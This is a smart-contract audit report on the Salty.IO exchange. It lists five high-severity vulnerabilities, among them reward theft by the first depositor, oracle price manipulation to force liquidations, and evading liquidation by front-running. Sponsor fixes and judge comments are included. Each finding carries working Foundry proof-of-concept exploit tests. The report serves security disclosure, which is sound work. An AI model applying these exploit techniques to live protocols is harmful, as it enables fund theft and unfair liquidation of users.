[H-01] Development Team might receive less SALT because there is no access control onVestingWallet#release()
Submitted by0xpiken
The Development Team could potentially incur a loss on their SALT distribution reward due to the absence of access control onVestingWallet#release().
Proof of Concept
When Salty exchange is actived, 10M SALT will be transferred toteamVestingWalletby callingInitialDistribution#distributionApproved():
62:salt.safeTransfer(address(teamVestingWallet),10*MILLION_ETHER);
teamVestingWalletis responsible for distributing 10M SALT linely over 10 years (Deployment.sol#L100):
teamVestingWallet=newVestingWallet(address(upkeep),uint64(block.timestamp),60*60*24*365*10);
From the above code we can see that the beneficiary ofteamVestingWalletisUpkeep.
Each timeUpkeep#performUpkeep()is called,teamVestingWalletwill release a certain amount of SALT toUpkeep, the beneficiary, and then the relased SALT will be transferred tomainWalletofmanagedTeamWallet:
functionstep11()publiconlySameContract{uint256releaseableAmount=VestingWallet(payable(exchangeConfig.teamVestingWallet())).releasable(address(salt));// teamVestingWallet actually sends the vested SALT to this contract - which will then need to be sent to the active teamWalletVestingWallet(payable(exchangeConfig.teamVestingWallet())).release(address(salt));salt.safeTransfer(exchangeConfig.managedTeamWallet().mainWallet(),releaseableAmount);}
However, there is no access control onteamVestingWallet.release(). Any one can callrelease()to distribute SALT without informingupkeep.upkeepdoesn’t know how many SALT has been distributed in advance, it has no way to transfer it to the development team, and the distributed SALT by directly callingteamVestingWallet.release()will be locked inupkeepforever.
Copy below codes toDAO.t.soland runCOVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url RPC_URL --match-test testTeamRewardIsLockedInUpkeep
functiontestTeamRewardIsLockedInUpkeep()public{uintreleasableAmount=teamVestingWallet.releasable(address(salt));uintupKeepBalance=salt.balanceOf(address(upkeep));uintmainWalletBalance=salt.balanceOf(address(managedTeamWallet.mainWallet()));//@audit-info a certain amount of SALT is releasableassertTrue(releasableAmount!=0);//@audit-info there is no SALT in upkeepassertEq(upKeepBalance,0);//@audit-info there is no SALT in mainWalletassertEq(mainWalletBalance,0);//@audit-info call release() before performUpkeep()teamVestingWallet.release(address(salt));upkeep.performUpkeep();upKeepBalance=salt.balanceOf(address(upkeep));mainWalletBalance=salt.balanceOf(address(managedTeamWallet.mainWallet()));//@audit-info all released SALT is locked in upKeepassertEq(upKeepBalance,releasableAmount);//@audit-info development team receive nothingassertEq(mainWalletBalance,0);}
Recommended Mitigation Steps
SinceexchangeConfig.managedTeamWalletis immutable, it is reasonable to configmanagedTeamWalletas the beneficiary whendeployingteamVestingWallet:
-   teamVestingWallet = new VestingWallet( address(upkeep), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );+   teamVestingWallet = new VestingWallet( address(managedTeamWallet), uint64(block.timestamp), 60 * 60 * 24 * 365 * 10 );
Introduce a new function inmanagedTeamWalletto transfer all SALT balance tomainWallet:
functionrelease(addresstoken)external{uintbalance=IERC20(token).balanceOf(address(this));if(balance!=0) {IERC20(token).safeTransfer(mainWallet,balance);}}
CallmanagedTeamWallet#release()inUpkeep#performUpkeep():
function step11() public onlySameContract{-   uint256 releaseableAmount = VestingWallet(payable(exchangeConfig.teamVestingWallet())).releasable(address(salt));-   // teamVestingWallet actually sends the vested SALT to this contract - which will then need to be sent to the active teamWalletVestingWallet(payable(exchangeConfig.teamVestingWallet())).release(address(salt));-   salt.safeTransfer( exchangeConfig.managedTeamWallet().mainWallet(), releaseableAmount );+   exchangeConfig.managedTeamWallet().release(address(salt));}
othernet-global (Salty.IO) confirmed and commented:
The ManagedWallet now the recipient of teamVestingWalletRewards to prevent the issue of DOS of the team rewards.https://github.com/othernet-global/salty-io/commit/534d04a40c9b5821ad4e196095df70c0021d15ab
ManagedWallet has been removed.https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5
Picodes (Judge) commented:
My initial view on this is that the issue is withinUpkeepas it integrates poorly with the vesting wallet. It forgets that there is no access control, so I tend to see this as in scope.
The issue is not strictly in the deployment scripts, not strictly in the vesting wallet either because it makes sense to have no access control onrelease, so it must be inUpkeep.
Note: For full discussion, seehere.
Status:Mitigation confirmed. Full details in reports from0xpiken,zzebra83, andt0x1c.

[H-02] First Liquidity provider can claim all initial pool rewards
Submitted by0xCiphky, also found by 0xCiphky (1,2),J4X,Toshii,stackachu,Silvermist,DedOhWale,OMEN,zhaojie, 0x3b (1,2,3),ether_sky,Evo,israeladelaja, RootKit0xCE (1,2),a3yip6,Stormreckson, andtwcctop
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L57
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L147
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L232
Liquidity providers can add liquidity to the protocol using the depositCollateralAndIncreaseShare or depositLiquidityAndIncreaseShare functions, both functions call the _increaseUserShare function to stake the users liquidity and account for the positions rewards. The current implementation has an issue, particularly in how it deals with the virtualRewards calculation for the first user. Since there is no current shares in the pool, then the virtualRewards calculation is skipped.
// Increase a user's share for the given whitelisted pool.function_increaseUserShare(addresswallet,bytes32poolID,uint256increaseShareAmount,booluseCooldown)internal{...uint256existingTotalShares=totalShares[poolID];if(existingTotalShares!=0// prevent / 0) {// Round up in favor of the protocol.uint256virtualRewardsToAdd=Math.ceilDiv(totalRewards[poolID] *increaseShareAmount,existingTotalShares);user.virtualRewards+=uint128(virtualRewardsToAdd);totalRewards[poolID] +=uint128(virtualRewardsToAdd);}// Update the deposit balancesuser.userShare+=uint128(increaseShareAmount);totalShares[poolID] =existingTotalShares+increaseShareAmount;...}
To understand the implications of this, we need to look at how a user’s rewards are calculated. The formula used in the userRewardForPool function is:
uint256 rewardsShare= (totalRewards[poolID] * user.userShare) / totalShares[poolID];
From this calculated rewardsShare, virtualRewards are then deducted:
return rewardsShare - user.virtualRewards;
In the case where the first user stakes in an empty pool, they end up having the same number of shares as the totalShares in the pool, but with zero virtualRewards. This means that the first user can claim all the pools rewards in the staking contract, as their share of rewards would not have the necessary deduction of virtualRewards.
// Returns the user's pending rewards for a specified pool.functionuserRewardForPool(addresswallet,bytes32poolID)publicviewreturns(uint256) {...// Determine the share of the rewards for the user based on their deposited shareuint256rewardsShare= (totalRewards[poolID] *user.userShare) /totalShares[poolID];...returnrewardsShare-user.virtualRewards;}
A potential issue is thelackof Initial Rewards in the Contract. Initially, the staking contract does not contain any rewards, meaning that if a user were to claim rewards immediately, they would receive nothing. To overcome this, the user needs to trigger theupkeepfunction. This function is responsible for transferring up to the maximum allowable daily rewards to the staking contract.
Theupkeepcontract employs a timer to regulate the frequency and quantity of rewards distribution. However, since this timer begins counting from the moment of the contract’s deployment (in the constructor), and considering the initial voting period for starting up the exchange spans several days, it becomes feasible to distribute the maximum daily reward amount by invoking upkeep.
Impact
A LP can exploit this vulnerability to claim all the current staking rewards in the contract. Initially, there are 555k SALT bootstrap rewards per pool in the stakingRewardsEmitter, which are emitted at a rate of 1% per day. As a result, the first LP could claim up to 5.5k SALT.
Proof Of Concept
functiontestFirstLPCanClaimAllRewards()public{assertEq(salt.balanceOf(alice),0);bytes32poolID1=PoolUtils._poolID(wbtc,weth);bytes32[]memorypoolIDs=newbytes32[](1);poolIDs[0] =poolID1;skip(2days);// Total needs to be worth at least $2500uint256depositedWBTC= (1000ether*10**8) /priceAggregator.getPriceBTC();uint256depositedWETH= (1000ether*10**18) /priceAggregator.getPriceETH();(uint256reserveWBTC,uint256reserveWETH) =pools.getPoolReserves(wbtc,weth);vm.startPrank(alice);// Alice call upkeepupkeep.performUpkeep();// check total rewards for pooluint256[]memorytotalRewards=newuint256[](1);totalRewards=collateralAndLiquidity.totalRewardsForPools(poolIDs);// Alice will deposit collateral(uint256addedAmountWBTC,uint256addedAmountWETH,uint256addedLiquidity) =collateralAndLiquidity.depositCollateralAndIncreaseShare(depositedWBTC,depositedWETH,0,block.timestamp,false);// check alices rewardsuintrewardsAlice=collateralAndLiquidity.userRewardForPool(alice,poolIDs[0]);collateralAndLiquidity.claimAllRewards(poolIDs);vm.stopPrank();assertEq(totalRewards[0],rewardsAlice);assertEq(salt.balanceOf(alice),totalRewards[0]);}
Tools Used:
Foundry
Recommendation:
The protocol can address this vulnerability in two ways:
Call theperformUpkeepfunction just before the initial distribution. This resets the timer, ensuring that a very small amount of rewards is sent to the staking contract if called again.Change thelastUpkeepTimeto the start of when the exchange goes live, instead of in the constructor. This also ensures that only a minimal amount of rewards is sent to the staking contract upon subsequent calls, mitigating the problem.
othernet-global (Salty.IO) confirmed and commented:
performUpkeep is now called at the start of BootstrapBallot.finalizeBallot to reset the emissions timers just before liquidity rewards claiming is started.https://github.com/othernet-global/salty-io/commit/4f0c9c6a6e3e4234135ab7119a0e380af3e9776c
Status:Mitigation confirmed. Full details in reports fromzzebra83,0xpiken, andt0x1c.

[H-03] The use of spot price by CoreSaltyFeed can lead to price manipulation and undesired liquidations
Submitted by00xSEV, also found byOMEN,J4X,miaowu,Myrault,Banditx0x,linmiaomiao,CongZhang-CertiK,n1punp, andjesjupyter
When the price moves, Chainlink instantly reports the spot price, while the TWAP slowly changes the price. The spot price of CoreSaltyFeed can be manipulated, allowing an attacker to move the price in a desired direction.
Vulnerability Details
The spot price ofCoreSaltyFeedcan be manipulated, even when considering automatic arbitrage. The cost of moving the price depends on the liquidity of the pools. While the protocol is small, it will be cheap to manipulate, but even as it grows, the cost won’t become prohibitively expensive.
If all the pools have2*1_000ETH of value each, the attack will cost only ~0.0036 ETH to move a price by 3%, and ~0.0363 ETH to move it by 10%.
Refer to the PoCs for the estimated cost of the attack.Assume the WBTC/USD price moves 3%, from $40,000 to$38,800. Chainlink updates instantly, but the TWAP takes some time. You can see my calculations of the TWAP price changehere.CoreSaltyFeedWBTC/USDS price will be adjusted to match Chainlink’s price by arbitrageurs.CoreSaltyFeedreturns $38,800, Chainlink returns$38,800, TWAP returns $40,000.The attacker moves theCoreSaltyFeedprice ~3%, but less than the difference between TWAP and Chainlink, to $38,000.As shown in the PoC, it will cost the attacker only 0.0035 ETH if the pools have 1000 ETH of liquidity, but if they have 100 ETH, it will require only ~0.0004 ETH.The difference betweenCoreSaltyFeedand Chainlink is $800, and from TWAP and Chainlink it's$1,200.Theaverage priceis set to ($38,000 +$38,800) / 2 = $38,400.Now the attacker can liquidate pools that should not be liquidatable because the price from PriceAggregator is lower than the real price. The attacker can do it first and get the rewards (5%, up to $500 by default). See the relevant codehere.// Reward the callerwbtc.safeTransfer(msg.sender,rewardedWBTC);weth.safeTransfer(msg.sender,rewardedWETH);maxRewardValueForCallingLiquidationis set to $500. Depending on Salty’s pool liquidity, ETH price, and how many positions an attacker can liquidate, profitability will vary. I argue that before the protocol gains traction, liquidity will be low for some time, making the attack profitable.We should also consider that sometimes it will be profitable for the attacker to move the price slightly and be the first to callliquidatein order to receive the rewards.Other liquidators, who don’t use this attack, will not be able to liquidate, which is unfair.
Note: WBTC and WETH movements of 3% are common and will happen often. For example, about a month ago, there was a 6.5% drop in 20 minutes as reported byBusiness Insider.
Variations
If the Chainlink oracle fails to update prices on time (due to block stuffing before the heartbeat or Chainlink DAO turning it off, as describedhereandhere), the attack becomes easier as a 3% price change in the market will not be necessary.In the event of a sudden crash in BTC and/or ETH, an attacker could mint undercollateralized USDS. The 200% collateral requirement, set inStableConfig.initialCollateralRatioPercentand calculated using the outdated TWAP price along with the manipulatedCoreSaltyFeed, would be ineffective as protection against this attack when the real price has already dropped below 100%.During a sudden crash of BTC and/or ETH,the oracle price feed may continue to report the incorrect minimum price. This can again lead to the minting of undercollateralized USDS.
Impact
Positions that should not be liquidated are liquidated => unexpected liquidation and loss of part of collateral for a borrower (on fees)Honest liquidators who don’t move the price won’t be able to liquidate because an attacker will move the price and liquidate in the same transaction
Proof of Concept
Put the code insrc/pools/tests/H2.t.sol, runCOVERAGE="yes" forge test -f wss://ethereum-sepolia.publicnode.com -vvv --mc H2
// SPDX-License-Identifier: BUSL 1.1pragmasolidity=0.8.22;import"../../dev/Deployment.sol";import"../PoolUtils.sol";contractH2isDeployment{TestERC20immutabletokenA;TestERC20immutabletokenB;addressALICE=address(0x1111);addressBOB=address(0x2222);constructor(){initializeContracts();grantAccessAlice();grantAccessBob();grantAccessCharlie();grantAccessDeployer();grantAccessDefault();finalizeBootstrap();vm.startPrank(address(daoVestingWallet));salt.transfer(DEPLOYER,1000000ether);salt.transfer(address(collateralAndLiquidity),1000000ether);vm.stopPrank();vm.startPrank(DEPLOYER);tokenA=newTestERC20("TOKENA",18);tokenB=newTestERC20("TOKENB",18);vm.stopPrank();_prepareToken(tokenA);_prepareToken(tokenB);_prepareToken(weth);vm.stopPrank();vm.prank(address(dao));poolsConfig.whitelistPool(pools,tokenA,tokenB);vm.stopPrank();}// Make the required approvals and transfer to Bob and Alice.function_prepareToken(IERC20token)internal{vm.startPrank(DEPLOYER);token.approve(address(pools),type(uint256).max);token.approve(address(collateralAndLiquidity),type(uint256).max);// For WBTC, we can't use 'ether', so we use 10**8.uintdecimals=TestERC20(address(token)).decimals();token.transfer(ALICE,1_000_000* (10**decimals));token.transfer(BOB,1_000_000* (10**decimals));vm.startPrank(ALICE);token.approve(address(pools),type(uint256).max);token.approve(address(collateralAndLiquidity),type(uint256).max);vm.startPrank(BOB);token.approve(address(pools),type(uint256).max);token.approve(address(collateralAndLiquidity),type(uint256).max);vm.stopPrank();}// Create pools that will participate in arbitrage// Note: We have all required pools for successful arbitrage, see ArbitrageSearch::_arbitragePath// swap: swapTokenIn->WETH// arb: WETH->swapTokenIn->WBTC->WETH// We have: tokenA/WETH, tokenA/WBTC, WBTC/WETHfunction_makeArbitragePossible(uintamountToDeposit)internal{// based on Pools.t.sol::testDepositDoubleSwapWithdrawvm.startPrank(DEPLOYER);wbtc.approve(address(collateralAndLiquidity),type(uint256).max);weth.approve(address(collateralAndLiquidity),type(uint256).max);tokenA.approve(address(collateralAndLiquidity),type(uint256).max);tokenB.approve(address(collateralAndLiquidity),type(uint256).max);tokenA.approve(address(pools),type(uint256).max);vm.warp(block.timestamp+stakingConfig.modificationCooldown());collateralAndLiquidity.depositCollateralAndIncreaseShare(amountToDeposit*10**8,amountToDeposit*1ether,0,block.timestamp,false);vm.stopPrank();vm.startPrank(address(dao));poolsConfig.whitelistPool(pools,tokenA,wbtc);poolsConfig.whitelistPool(pools,tokenA,weth);poolsConfig.whitelistPool(pools,tokenB,wbtc);poolsConfig.whitelistPool(pools,tokenB,weth);vm.stopPrank();vm.startPrank(DEPLOYER);collateralAndLiquidity.depositLiquidityAndIncreaseShare(tokenA,wbtc,amountToDeposit*1ether,amountToDeposit*10**8,0,block.timestamp,false);collateralAndLiquidity.depositLiquidityAndIncreaseShare(tokenB,wbtc,amountToDeposit*1ether,amountToDeposit*10**8,0,block.timestamp,false);collateralAndLiquidity.depositLiquidityAndIncreaseShare(tokenA,weth,amountToDeposit*1ether,amountToDeposit*1ether,0,block.timestamp,false);collateralAndLiquidity.depositLiquidityAndIncreaseShare(tokenB,weth,amountToDeposit*1ether,amountToDeposit*1ether,0,block.timestamp,false);vm.stopPrank();}function_getReservesAndPrice(IERC20_tokenA,IERC20_tokenB)internalviewreturns(stringmemory_tokenASymbol,stringmemory_tokenBSymbol,uintreserveA,uintreserveB,uintpriceBinA) {(reserveA,reserveB) =pools.getPoolReserves(_tokenA,_tokenB);_tokenASymbol=TestERC20(address(_tokenA)).symbol();_tokenBSymbol=TestERC20(address(_tokenB)).symbol();uint8_tokenADecimals=TestERC20(address(_tokenA)).decimals();uint8_tokenBDecimals=TestERC20(address(_tokenB)).decimals();// reserveA / reserveB  || b.decimals - a.decimals  || normalizer// 1e8/1e18             || diff 10                  || 1e28// 1e18/1e18            || diff 0                   || 1e18// 1e18/1e8             || diff -10                 || 1e8int8decimalsDiff=int8(_tokenBDecimals) -int8(_tokenADecimals);uintnormalizerPower=uint8(int8(18) +decimalsDiff);uintnormalizer=10**normalizerPower;// price with precision 1e18priceBinA=reserveB==0?0: (reserveA*normalizer) /reserveB;}function_printReservesAndPriceFor(IERC20_tokenA,IERC20_tokenB)internalview{(stringmemory_tokenASymbol,stringmemory_tokenBSymbol,uintreserveA,uintreserveB,uintpriceBinA) =_getReservesAndPrice(_tokenA,_tokenB);console2.log("%s reserves: %e",_tokenASymbol,reserveA);console2.log("%s reserves: %e",_tokenBSymbol,reserveB);console2.log("%s price in %s: %e",_tokenBSymbol,_tokenASymbol,priceBinA);console.log("");}// Extracted some local variables to storage due to too many local variables.structMovePriceParams{uintamountToExchange;uintexpectedMovementPercents;uintexpectedLoss;}uintgasBefore=1;// Set to 1 to save gas on updates and obtain more accurate gas estimations.uintstepsCount;// Splitting a swap into several steps will significantly reduce slippage.// More steps will further reduce slippage, thereby decreasing the cost of the attack.// However, too many steps can incur high gas costs; for instance, 100 steps will cost approximately 3+4=7 million gas (as indicated in the console.log output).uintconstantsteps=100;function_movePrice(MovePriceParamsmemoryp)internal{/* Before the attack */console.log("\n%s","__BEFORE");// Check price before(,,,,uintpriceBefore) =_getReservesAndPrice(tokenA,weth);assertEq(1ether,priceBefore);// price is 1:1_printReservesAndPriceFor(tokenA,weth);uintwethBefore=weth.balanceOf(ALICE);uinttokenABefore=tokenA.balanceOf(ALICE);console2.log("weth.balanceOf(ALICE): %e",wethBefore);console2.log("tokenA.balanceOf(ALICE): %e",tokenABefore);/* Move the price */vm.startPrank(ALICE);gasBefore=gasleft();for(uinti;i<steps;i++){pools.depositSwapWithdraw(tokenA,weth,p.amountToExchange/steps,0,block.timestamp+300);}console.log("Gas first(for) loop: ",gasBefore-gasleft());/* After the attack */console.log("\n%s","__AFTER");// Console.log the output_printReservesAndPriceFor(tokenA,weth);uintwethAfter=weth.balanceOf(ALICE);uinttokenAAfter=tokenA.balanceOf(ALICE);console2.log("weth.balanceOf(ALICE): %e",weth.balanceOf(ALICE));console2.log("tokenA.balanceOf(ALICE): %e",tokenA.balanceOf(ALICE));uintwethGained=wethAfter-wethBefore;uinttokenALost=tokenABefore-tokenAAfter;console2.log("weth.balanceOf(ALICE) diff: %e",wethGained);console2.log("tokenA.balanceOf(ALICE) diff: %e",tokenALost);// Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio,// we can subtract and add them as equivalent values.uintattackPrice=tokenALost-wethGained;console2.log("Losses for the attacker (before swapping back): %e",attackPrice);// Assert that the attack was successful and inexpensive.(,,,,uintpriceAfter) =_getReservesAndPrice(tokenA,weth);uintpriceDiff=priceAfter-priceBefore;assertTrue(priceDiff>=p.expectedMovementPercents*1ether/100);/* The attacker can further reduce the cost by exchanging back. *//* After the exchange, the price is moved back. */console.log("\n%s","__AFTER_EXCHANGING_BACK");(,,,,uintcurrentPrice) =_getReservesAndPrice(tokenA,weth);uintstep=p.amountToExchange/steps;gasBefore=gasleft();while(currentPrice>1ether){pools.depositSwapWithdraw(weth,tokenA,step,0,block.timestamp);(,,,,currentPrice) =_getReservesAndPrice(tokenA,weth);stepsCount++;}// Console.log the outputconsole2.log("Gas second(while) loop: ",gasBefore-gasleft());console2.log("stepsCount",stepsCount);_printReservesAndPriceFor(tokenA,weth);uintwethAfterBalancing=weth.balanceOf(ALICE);uinttokenAAfterBalancing=tokenA.balanceOf(ALICE);console2.log("weth.balanceOf(ALICE): %e",weth.balanceOf(ALICE));console2.log("tokenA.balanceOf(ALICE): %e",tokenA.balanceOf(ALICE));intwethDiff=int(wethAfterBalancing) -int(wethBefore);inttokenADiff=int(tokenAAfterBalancing) -int(tokenABefore);console2.log("weth.balanceOf(ALICE) diff: %e",wethDiff);console2.log("tokenA.balanceOf(ALICE) diff: %e",tokenADiff);// Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio,// we can subtract and add them as equivalent values.intsumDiff=wethDiff+tokenADiff;console2.log("Diff (positive=profit) for the attacker: %e",sumDiff);console2.log("Arbitrage profits for DAO: %e",pools.depositedUserBalance(address(dao),weth));}functiontestMovePrice10PercentsFor1000EtherPools()public{_makeArbitragePossible(1_000);_movePrice(MovePriceParams(75ether,10,0.0363ether));}functiontestMovePrice3PercentsFor1000EtherPools()public{_makeArbitragePossible(1_000);_movePrice(MovePriceParams(23ether,3,0.0036ether));}functiontestMovePrice3PercentsFor100EtherPools()public{_makeArbitragePossible(100);_movePrice(MovePriceParams(2.3ether,3,0.0004ether));}functiontestMovePrice3PercentsFor10EtherPools()public{_makeArbitragePossible(10);_movePrice(MovePriceParams(0.23ether,3,0.00008ether));}}
(Optional) You can place this AWK script in1e18.sh, make it executable withchmod +x 1e18.sh, and runCOVERAGE="yes" forge test -f wss://ethereum-sepolia.publicnode.com -vvv --mc M2 | ./1e18.shfor a more readable output. This script will convert numbers in exponential notation to a floating point format with three decimal places. For example,1e17will be printed as0.100.
#!/bin/bashawk'{for(i=1; i<=NF; i++) {if ($i ~ /[0-9]+e[+-]?[0-9]+/) {$i = sprintf("%.3f", $i / 1e18)}}print $0}'
Recommended Mitigation Steps
Consider replacingCoreSaltyFeedwith a different oracle that provides better protection against manipulation, like Band Protocol.
othernet-global (Salty.IO) confirmed and commented:
Note: the overcollateralized stablecoin mechanism has been removed from the DEX.https://github.com/othernet-global/salty-io/commit/f3ff64a21449feb60a60c0d60721cfe2c24151c1
The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
Status:Mitigation confirmed. Full details in reports fromt0x1c,0xpiken, andzzebra83.

[H-04] First depositor can break staking-rewards accounting
Submitted by0xRobocop, also found bystackachu,Toshii,Arz,DedOhWale,peanuts,Draiakoo,zhaojie, andether_sky
Staking in SALTY pools happens automatically when adding liquidity. In order to track the accrued rewards, the code “simulates” the amount of virtual rewards that need to be added given the increase of shares and lend this amount to the user. So, when computing the real rewards for a given user, the code will compute its rewards based on thetotalRewardsof the given pool minus the virtual rewards. The following code computes the virtual rewards for a user:
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L81
uint256virtualRewardsToAdd=Math.ceilDiv(totalRewards[poolID] *increaseShareAmount,existingTotalShares);
Basically, it aims to maintain the current ratio oftotalRewardsandexistingTotalShares. The issue with this is that allows the first depositor to set the ratio too high by donating some SALT tokens to the contract. For example, consider the following values:
uint256virtualRewardsToAdd=Math.ceilDiv(1000e18*200e18,202);
The returned value is in order of 39-40 digits. Which is beyond what 128 bits can represent:
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L83-L84
user.virtualRewards+=uint128(virtualRewardsToAdd);totalRewards[poolID] +=uint128(virtualRewardsToAdd);
This will broke the reward computations. For a more concrete example look the PoC.
Proof of Concept
The following coded PoC showcase an scenario where the first depositor set therewards / sharesratio too high, causing the rewards system to get broken. Specifically, it shows how the sum of the claimable rewards for each user is greater than the SALT balance of the contract.
It should be pasted underStaking/tests/StakingRewards.t.sol.
functiontestUserCanBrickRewards()public{vm.startPrank(DEPLOYER);// Alice is the first depositor to poolIDs[1] and she deposited the minimum amounts 101 and 101 of both tokens.// Hence, alice will get 202 shares.stakingRewards.externalIncreaseUserShare(alice,poolIDs[1],202,true);assertEq(stakingRewards.userShareForPool(alice,poolIDs[1]),202);vm.stopPrank();// Alice adds 100 SALT as rewards to the pool.AddedReward[]memoryaddedRewards=newAddedReward[](1);addedRewards[0] =AddedReward(poolIDs[1],100ether);stakingRewards.addSALTRewards(addedRewards);// Bob deposits 100 DAI and 100 USDS he will receive (202 * 100e8) / 101 = 200e18 shares.vm.startPrank(DEPLOYER);stakingRewards.externalIncreaseUserShare(bob,poolIDs[1],200e18,true);assertEq(stakingRewards.userShareForPool(bob,poolIDs[1]),200e18);vm.stopPrank();// Charlie deposits 10000 DAI and 10000 USDS he will receive (202 * 10000e8) / 101 = 20000e18 shares.vm.startPrank(DEPLOYER);stakingRewards.externalIncreaseUserShare(charlie,poolIDs[1],20000e18,true);assertEq(stakingRewards.userShareForPool(charlie,poolIDs[1]),20000e18);vm.stopPrank();// Observe how virtual rewards are broken.uint256virtualRewardsAlice=stakingRewards.userVirtualRewardsForPool(alice,poolIDs[1]);uint256virtualRewardsBob=stakingRewards.userVirtualRewardsForPool(bob,poolIDs[1]);uint256virtualRewardsCharlie=stakingRewards.userVirtualRewardsForPool(charlie,poolIDs[1]);console.log("Alice virtual rewards %s",virtualRewardsAlice);console.log("Bob virtual rewards %s",virtualRewardsBob);console.log("Charlie virtual rewards %s",virtualRewardsCharlie);// Observe the amount of claimable rewards.uint256aliceRewardAfter=stakingRewards.userRewardForPool(alice,poolIDs[1]);uint256bobRewardAfter=stakingRewards.userRewardForPool(bob,poolIDs[1]);uint256charlieRewardAfter=stakingRewards.userRewardForPool(charlie,poolIDs[1]);console.log("Alice rewards %s",aliceRewardAfter);console.log("Bob rewards %s",bobRewardAfter);console.log("Charlie rewards %s",charlieRewardAfter);// The sum of claimable rewards is greater than 1000e18 SALT.uint256sumOfRewards=aliceRewardAfter+bobRewardAfter+charlieRewardAfter;console.log("All rewards &s",sumOfRewards);bytes32[]memorypoolIDs2;poolIDs2=newbytes32[](1);poolIDs2[0] =poolIDs[1];// It revertsvm.expectRevert("ERC20: transfer amount exceeds balance");vm.startPrank(charlie);stakingRewards.claimAllRewards(poolIDs2);vm.stopPrank();}
Recommended Mitigation Steps
Some options:
Make the functionaddRewardsin theStakingRewardscontract permissioned. In this way, all rewards will need to go through the emitter first.Do not let the first depositor to manipulate the initial ratio of rewards / share. It is possible for every pool to burn the initial 10000 shares and starts with an initial small amount of rewards, kind of simulating being the first depositor.
othernet-global (Salty.IO) confirmed and commented:
virtualRewards and userShare are now uint256 rather than uint128.Fixed in:https://github.com/othernet-global/salty-io/commit/5f79dc4f0db978202ab7da464b09bf08374ec618
Picodes (Judge) commented:
Considering that you could time this to break in the future and that it seems easily doable by an attacker on a new pool, High severity seems justified under “Loss of matured yield”.
Status:Mitigation confirmed. Full details in reports fromt0x1c,0xpiken, andzzebra83.

[H-05] User can evadeliquidationby depositing the minimum of tokens and gain time to not be liquidated
Submitted by0xbepresent, also found byArz, Audinarey (1,2),c0pp3rscr3w3r,stackachu,memforvik,HALITUS,Infect3d,Udsen,Toshii,J4X,Aymen0909,Kalyan-Singh,0xlemon,novodelta,mussucal,Draiakoo,0xpiken,zhaojie,zhaojohnson,00xSEV,juancito,CaeraDenoir,n0kto,DanielArmstrong,Auditwolf,Krace,israeladelaja,0xAsen,pkqs90,PENGUN,0xBinChook,lanrebayode77,twcctop,KingNFT,Jorgect,b0g0,0xRobocop,0xCiphky,djxploit,erosjohn,holydevoti0n,Banditx0x,iamandreiski,ayden,0xanmol,klau5,solmaxis69,developerjordy, and0xAlix2
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L140
https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L70
TheCollateralAndLiquiditycontract contains a critical vulnerability that allows a user undergoing liquidation to evade the process by manipulating theuser.cooldownExpirationvariable. This manipulation is achieved through theCollateralAndLiquidity::depositCollateralAndIncreaseSharefunction, specifically within theStakingRewards::_increaseUserSharefunction (code line#70):
File:StakingRewards.sol57:function_increaseUserShare(addresswallet,bytes32poolID,uint256increaseShareAmount,booluseCooldown)internal58: 		{59:require(poolsConfig.isWhitelisted(poolID),"Invalid pool");60:require(increaseShareAmount!=0,"Cannot increase zero share");61:62:UserShareInfostorageuser=_userShareInfo[wallet][poolID];63:64:if(useCooldown)65:if(msg.sender!=address(exchangeConfig.dao()) )// DAO doesn't use the cooldown66: 			{67:require(block.timestamp>=user.cooldownExpiration,"Must wait for the cooldown to expire");68:69:// Update the cooldown expiration for future transactions70:user.cooldownExpiration=block.timestamp+stakingConfig.modificationCooldown();71: 			}72:73:uint256existingTotalShares=totalShares[poolID];74:75:// Determine the amount of virtualRewards to add based on the current ratio of rewards/shares.76:// The ratio of virtualRewards/increaseShareAmount is the same as totalRewards/totalShares for the pool.77:// The virtual rewards will be deducted later when calculating the user's owed rewards.78:if(existingTotalShares!=0)// prevent / 079:         	{80:// Round up in favor of the protocol.81:uint256virtualRewardsToAdd=Math.ceilDiv(totalRewards[poolID] *increaseShareAmount,existingTotalShares);82:83:user.virtualRewards+=uint128(virtualRewardsToAdd);84:totalRewards[poolID] +=uint128(virtualRewardsToAdd);85: 	        }86:87:// Update the deposit balances88:user.userShare+=uint128(increaseShareAmount);89:totalShares[poolID] =existingTotalShares+increaseShareAmount;90:91:emitUserShareIncreased(wallet,poolID,increaseShareAmount);92: 		}
Malicious user can perform front-running of theliquidationfunction by depositing small amounts of tokens to his position, incrementing theuser.cooldownExpirationvariable. Consequently, the execution of theliquidationfunction will be reverted with the error messageMust wait for the cooldown to expire.This vulnerability could lead to attackers evading liquidation, potentially causing the system to enter into debt as liquidations are avoided.
Proof of Concept
A test case, namedtestUserLiquidationMayBeAvoided, has been created to demonstrate the potential misuse of the system. The test involves the following steps:
User Alice deposits and borrow the maximum amount.The collateral price crashes.Alice maliciously front-runs theliquidationexecution by depositing a the minimum amount using thecollateralAndLiquidity::depositCollateralAndIncreaseSharefunction.Theliquidationtransaction is reverted by “Must wait for the cooldown to expire” error.
